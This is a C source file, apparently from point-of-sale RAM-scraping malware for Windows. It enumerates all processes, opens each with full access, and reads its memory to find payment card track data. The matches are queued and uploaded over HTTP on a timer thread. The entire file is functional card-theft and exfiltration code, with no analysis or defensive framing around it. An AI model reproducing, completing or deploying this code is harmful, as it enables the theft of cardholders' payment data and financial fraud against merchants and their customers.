/*
TODO:
Most pos systems now encrypt stuffs in memory i assume
https://msdn.microsoft.com/en-us/library/windows/desktop/aa380262(v=vs.85).aspx
so hook and montiro ?
*/
#include <Windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "scan.h"
#include "../stdlib.h"
#include "tracks.h"
#include "../http.h"
HANDLE queueMutex = NULL;
DWORD queueSize = 0;

void QueueUpload(track_result* res) {
	DWORD dhWaitResult;

	CHAR* track = smmemdup(res->result, res->length + 1, res->length);
	track[res->length] = 0;

	dhWaitResult = smstrlen(track);

	if (queueMutex == NULL) {
		queueMutex = CreateMutex(NULL, TRUE, "queueMutexw");
		if (queueMutex != NULL) {
			uploadQueue[queueSize] = (LPCSTR)track;
			queueSize++;
			ReleaseMutex(queueMutex);
		}
	}
	else {
		dhWaitResult = WaitForSingleObject(queueMutex, INFINITE);

		switch (dhWaitResult) {
		case WAIT_OBJECT_0:
			uploadQueue[queueSize] = (LPCSTR)track;
			queueSize++;

			if (queueSize == (UPLOAD_QUEUE_SIZE - 1)) {
				ForceUpload();
			}

			ReleaseMutex(queueMutex);
			break;
		case WAIT_ABANDONED:
			break;
		}
	}
}


void ForceUpload() {
	if (queueSize == 0)
		return;

	DWORD i, qi, strLen, sentLen = 0;
	CHAR* httpBody = NULL;

	httpBody = HeapAlloc(GetProcessHeap(), 0, 1024);
	if (httpBody == NULL) {
		return;
	}
	RtlSecureZeroMemory(httpBody, 1024);

	for (i = 0; i < queueSize; i++) {
		strLen = smstrlen(uploadQueue[i]);
		for (qi = 0; qi < strLen; qi++) {
			httpBody[sentLen + qi] = uploadQueue[i][qi];
		}

		sentLen += strLen;

	}

	//MessageBox(0, httpBody, "!", 0);

	HttpTrack(httpBody);
	queueSize = 0;
	ClearQueue();

	if (httpBody != NULL)
		HeapFree(GetProcessHeap(), 0, httpBody);

}


DWORD ScanForTracks(track_handler handler) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &entry) == TRUE) {
		do {
			HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

			if (hp) {
				FindTracks(hp, GetBaseAddress(hp, entry.szExeFile), handler);
				CloseHandle(hp);
			}

		} while (Process32Next(snapshot, &entry) == TRUE);
	}

	return SCAN_SUCCEEDED;
}
DWORD GetBaseAddress(HANDLE process, LPCSTR processName) {
	HMODULE* mods = HeapAlloc(GetProcessHeap(), 0, sizeof(HMODULE) * 1024);
	if (mods == NULL) {
		return -1;
	}
	DWORD needed, i;

	if (EnumProcessModules(process, mods, 1024, &needed)) {
		TCHAR szModName[MAX_PATH];
		//	MEM_ZERO(i2, szModName, MAX_PATH)
		RtlSecureZeroMemory(szModName, MAX_PATH);
		for (i = 0; i < (needed / sizeof(HMODULE)); i++) {
			if (GetModuleFileNameEx(process, mods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
				if (smstrstr(szModName, processName) != NULL) {
					return (DWORD)mods[i];
				}
				//				MEM_ZERO(i2, szModName, MAX_PATH);
				RtlSecureZeroMemory(szModName, MAX_PATH);
			}
		}
	}

	HeapFree(GetProcessHeap(), 0, mods);

	return 0;
}

VOID FindTracks(HANDLE process, DWORD baseAddress, track_handler handler) {
	DWORD mem = baseAddress;
	SYSTEM_INFO si;
	DWORD bytesRead;
	MEMORY_BASIC_INFORMATION mbi;

	CHAR* scannedMemory = HeapAlloc(GetProcessHeap(), 0, SCAN_SIZE);
	if (scannedMemory == NULL) {
		return;
	}
	//	MEM_ZERO(i, scannedMemory, SCAN_SIZE);
	RtlSecureZeroMemory(scannedMemory, SCAN_SIZE);
	DWORD scanSize;
	DWORD lasterr;

	track_search ts;
	ts.buffer = NULL;
	ts.offset = 0;
	ts.bufferSize = 0;

	if (scannedMemory == NULL)
		return;

	GetSystemInfo(&si);

	while (mem < (DWORD)si.lpMaximumApplicationAddress) {
		VirtualQueryEx(process, (LPVOID)mem, &mbi, sizeof(MEMORY_BASIC_INFORMATION));

		DWORD current = (DWORD)mem;

		while (1) {
			scanSize = ((DWORD)mbi.BaseAddress + mbi.RegionSize) - current;
			scanSize = MIN(scanSize, SCAN_SIZE);

			if (scanSize <= 0)
				break;

			if (ReadProcessMemory(process, (LPVOID)mem, scannedMemory, scanSize, &bytesRead)) {
				if (findFirstTrack(scannedMemory, bytesRead, &ts)) {

					// track was found
					do {
						handler(&ts.result);
					} while (findNextTrack(&ts));
				}
				current += bytesRead;
			}
			else {
				current += scanSize;
				lasterr = GetLastError();
			}
		}

		mem = ((DWORD)mbi.BaseAddress + mbi.RegionSize);
	}

	HeapFree(GetProcessHeap(), 0, scannedMemory);

	return;
}




void ClearQueue() {
	DWORD i;
	for (i = 0; i < queueSize; i++) {
		HeapFree(GetProcessHeap(), 0, uploadQueue[i]);
		uploadQueue[i] = NULL;
	}
}


DWORD WINAPI UploadTimer(LPVOID param) {
	DWORD initialized = 0;
	ULONGLONG lasttc = 0;

	ULONGLONG currenttc;

	DWORD dhWaitResult;

	while (1) {
		if (queueMutex == NULL) {
			Sleep(UPLOAD_SLEEP_MS);
			continue;
		}

		if (!initialized) {
			lasttc = GetTickCount64();
			initialized = 1;
		}

		currenttc = GetTickCount64();

		if (lasttc >= currenttc) { // we wrapped around
			initialized = 0;
			currenttc = 0;
			continue;
		}

		dhWaitResult = WaitForSingleObject(queueMutex, INFINITE);

		switch (dhWaitResult) {
		case WAIT_OBJECT_0:
			ForceUpload();
			break;
		case WAIT_ABANDONED:
			break;
		}

		if (ReleaseMutex(queueMutex) == 0) {
		//	MessageBox(NULL, "XD", "Failed to Release", MB_ICONWARNING);
			Sleep(10000000);
		}

		Sleep(UPLOAD_SLEEP_MS);
	}

	return 0;
}
